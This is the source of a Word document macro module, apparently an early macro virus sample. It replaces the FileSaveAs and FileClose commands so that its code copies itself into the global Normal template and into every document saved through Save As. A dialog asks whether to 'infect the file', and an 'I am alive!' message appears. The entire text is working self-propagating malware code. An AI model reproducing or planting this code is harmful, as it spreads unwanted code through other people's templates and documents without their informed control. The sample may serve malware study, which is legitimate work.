   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document with a new name"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim name_$
   Dim button1
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   On Error GoTo -1: On Error GoTo trap
   WordBasic.Dialog.FileSaveAs dlg      'execute the dialog.
   WordBasic.FileSaveAs dlg
   name_$ = WordBasic.[FileName$]()
   button1 = WordBasic.MsgBox("Shall I infect the file ?", "Propagation of the virus", 36)
   WordBasic.ToolsOptionsSave SummaryPrompt:=0
   If button1 = -1 Then
       If (dlg.Format = 0) Or (dlg.Format = 1) Then
           dlg.Format = 1
           dlg.Name = name_$
           WordBasic.FileSaveAs dlg
           WordBasic.MacroCopy "Global:FileSaveAs", name_$ + ":FileSaveAs"
           WordBasic.MacroCopy "Global:FileClose", name_$ + ":FileClose"
        End If
   End If
   trap:
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the current document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   Dim infected
   Dim normal
   Dim count_
   On Error GoTo -1: On Error GoTo trap
   WordBasic.MsgBox "I am alive!", "Activization", 16
   infected = 0
   normal = WordBasic.CountMacros(0)
   If normal > 0 Then
       For count_ = 1 To normal
           If WordBasic.[MacroName$](count_, 0, 0) = "FileClose" Then
               infected = 1
           End If
       Next count_
   End If
   If infected = 0 Then
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "Global:FileClose"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs"
   End If
   trap:
   WordBasic.FileClose
   End Sub
